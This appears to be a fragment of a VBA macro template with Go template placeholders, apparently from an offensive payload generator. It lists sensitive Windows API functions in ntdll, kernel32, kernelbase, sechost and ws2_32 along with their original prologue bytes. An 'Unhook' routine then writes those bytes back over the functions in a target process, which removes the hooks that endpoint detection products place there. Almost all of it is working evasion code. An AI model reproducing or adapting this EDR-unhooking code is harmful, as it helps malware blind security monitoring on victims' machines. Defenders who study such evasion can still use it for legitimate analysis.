{{.Variables.patch}} = Array("4c8bd1b86a000000", "4c8bd1b841000000", "4c8bd1b86e000000", "4c8bd1b818000000", "4c8bd1b876000000", "4c8bd1b879000000", "4c8bd1b88e000000", "4c8bd1b80f000000", "4c8bd1b855000000", "4c8bd1b81d000000", "4c8bd1b8b3000000", "4c8bd1b8b9000000", "4c8bd1b84d000000", "4c8bd1b84a000000", "4c8bd1b84e000000", "4c8bd1b8c1000000", "4c8bd1b8c8000000", "4c8bd1b834000000", "4c8bd1b8d0000000", "4c8bd1b8d2000000", "4c8bd1b8d3000000", "4c8bd1b8d6000000", "4c8bd1b807000000", "4c8bd1b83c000000", "4c8bd1b81e000000", "4c8bd1b8f2000000", "4c8bd1b805010000", "4c8bd1b813010000", "4c8bd1b828000000", "4c8bd1b814010000", "4c8bd1b815010000", "4c8bd1b833000000", "4c8bd1b812000000", "4c8bd1b820010000", "4c8bd1b826000000", "4c8bd1b828010000", "4c8bd1b830000000", "4c8bd1b824000000", "4c8bd1b82f000000", "4c8bd1b850000000", "4c8bd1b83d000000", "4c8bd1b846010000", "4c8bd1b819000000", "4c8bd1b825000000", "4c8bd1b836000000", "4c8bd1b861010000")
{{.Variables.boolresult}} = {{.Variables.Prep}}("ntdll", {{.Variables.dataaddr}}, {{.Variables.patch}})

{{.Variables.dataaddr}} = Array("NtQueryVirtualMemory", "NtQueueApcThread", "NtQueueApcThreadEx", "NtReadVirtualMemory", "NtRenameKey", "NtResumeThread", "NtSetContextThread", "NtSetInformationFile", "NtSetInformationProcess", "NtSetInformationThread", "NtSetInformationVirtualMemory", "NtSetValueKey", "NtSuspendThread", "NtSystemDebugControl", "NtTerminateProcess", "NtTerminateThread", "NtUnmapViewOfSection", "NtUnmapViewOfSectionEx", "NtWriteFile", "NtWriteVirtualMemory")
{{.Variables.patch}} = Array("4c8bd1b823000000", "4c8bd1b845000000", "4c8bd1b865010000", "4c8bd1b83f000000", "4c8bd1b872010000", "4c8bd1b852000000", "4c8bd1b88b010000", "4c8bd1b827000000", "4c8bd1b81c000000", "4c8bd1b80d000000", "4c8bd1b89e010000", "4c8bd1b860000000", "4c8bd1b8bc010000", "4c8bd1b8bd010000", "4c8bd1b82c000000", "4c8bd1b853000000", "4c8bd1b82a000000", "4c8bd1b8cc010000", "4c8bd1b808000000", "4c8bd1b83a000000")
{{.Variables.boolresult}} = {{.Variables.Prep}}("ntdll", {{.Variables.dataaddr}}, {{.Variables.patch}})

{{.Variables.dataaddr}} = Array("LoadModule", "Process32First", "Process32Next", "ReadConsoleA", "ReadConsoleW", "Toolhelp32ReadProcessMemory", "CreateThread", "CreateToolhelp32Snapshot", "WinExec", "CreateProcessA", "CreateProcessW", "CreateRemoteThread", "ReadProcessMemory")
{{.Variables.patch}} = Array("8bff558bec81ec30", "ff25480dd475cccc", "ff253c0dd475cccc", "8bff558bec57ff75", "8bff558becff751c", "8bff558bec6afe68", "8bff558bec83e4f8", "8bff558bec5dff25", "8bff558bec5dff25", "8bff558becff7520", "8bff558bec5dff25", "8bff558bec83ec0c", "8bff558bec83ec0c")
{{.Variables.boolresult}} = {{.Variables.Prep}}("kernel32", {{.Variables.dataaddr}}, {{.Variables.patch}})

{{.Variables.dataaddr}} = Array("OpenProcess", "CreateRemoteThreadEx", "FindFirstFileA", "FindFirstFileExA", "FindFirstFileExW", "FindFirstFileW", "FreeLibrary", "K32EnumProcesses", "LoadLibraryExA", "LoadLibraryExW", "ReadFile", "ResumeThread", "VirtualAlloc", "VirtualAllocEx", "VirtualProtect", "VirtualProtectEx", "WriteProcessMemory")
{{.Variables.patch}} = Array("8bff558bec83ec24", "68a0020000682867", "8bff558bec83e4f8", "8bff558bec83e4f8", "8bff558bec83e4f8", "8bff558bec33c050", "8bff558bec51538b", "6a1c68105cb375e8", "8bff558bec8b5508", "8bff558bec83e4f8", "8bff558bec6afe68", "8bff558bec518d45", "8bff558bec51518b", "8bff558bec6affff", "8bff558bec56ff75", "6888000000684020", "8bff558bec81ec30")
{{.Variables.boolresult}} = {{.Variables.Prep}}("kernelbase", {{.Variables.dataaddr}}, {{.Variables.patch}})

{{.Variables.dataaddr}} = Array("RegisterServiceCtrlHandlerW", "ControlService", "RegisterServiceCtrlHandlerExW",  "RegisterServiceCtrlHandlerA", "ControlServiceExA", "DeleteService", "RegisterServiceCtrlHandlerExA",  "CreateServiceA", "CreateServiceW")
{{.Variables.patch}} = Array("8bff558bec8b5510", "8bff558bec518b55", "6a2468e0431a76e8", "6a106840441a76e8", "8bff558bec518b55", "8bff558bec5dff25", "8bff558bec5dff25", "8bff558bece8f848", "8bff558bece818df")
{{.Variables.boolresult}} = {{.Variables.Prep}}("sechost", {{.Variables.dataaddr}}, {{.Variables.patch}})

{{.Variables.dataaddr}} = Array("WSAAccept", "WSAConnect", "accept", "bind", "connect", "listen")
{{.Variables.patch}} = Array("8bff558bec6a006a", "8bff558beca19884", "8bff558bec83ec1c", "8bff558bec83ec0c", "8bff558bec8b4d08", "6a1068e03c1a76e8")
{{.Variables.boolresult}} = {{.Variables.Prep}}("ws2_32", {{.Variables.dataaddr}}, {{.Variables.patch}})

#End if
End Sub


Function {{.Variables.Prep}}({{.Variables.dll}}, {{.Variables.addrarry}} As Variant, {{.Variables.patcharray}} As Variant) As Variant
Dim {{.Variables.dllname}} As String
Dim {{.Variables.proc}} As String
{{.Variables.dllname}} = {{.Variables.dll}}
For i = 0 To UBound({{.Variables.addrarry}})
	{{.Variables.proc}} = {{.Variables.addrarry}}(i)
	{{.Variables.buff}} = {{.Variables.patcharray}}(i)
	 {{.Variables.boolresult}} = {{.Variables.Unhook}}({{.Variables.dll}}, {{.Variables.proc}}, {{.Variables.buff}})
Next
End Function


Function {{.Variables.Unhook}}({{.Variables.dll}}, {{.Variables.proc}}, {{.Variables.buff}}) As String
	Dim {{.Variables.pprocaddress}} As LongPtr
	Dim {{.Variables.bytecode}} As Long
	Dim {{.Variables.EDRByteArray}}() As Byte
	Dim {{.Variables.edrzL}} As Long


	{{.Variables.pprocaddress}} = {{.Variables.GetProcAddress}}({{.Variables.GetModuleHandleA}}({{.Variables.dll}}), {{.Variables.proc}})
	
	{{.Variables.bytecode}} = Len({{.Variables.buff}}) / 2
	ReDim {{.Variables.EDRByteArray}}(0 To {{.Variables.bytecode}})
	For i = 0 to {{.Variables.bytecode}} - 1
		If i = 0 Then
			{{.Variables.edrpos}} = i + 1
		Else
			{{.Variables.edrpos}} = i * 2 + 1
		End If
				{{.Variables.Value1}} = Mid({{.Variables.buff}}, {{.Variables.edrpos}}, 2)
				{{.Variables.EDRByteArray}}(i) = Val("&H" & {{.Variables.Value1}})
	Next
	{{.Variables.WriteStuff}} {{.Variables.pInfo}}.hProcess, {{.Variables.pprocaddress}}, VarPtr({{.Variables.EDRByteArray}}(0)), UBound({{.Variables.EDRByteArray}}), {{.Variables.edrzL}}

End Function
	`
}
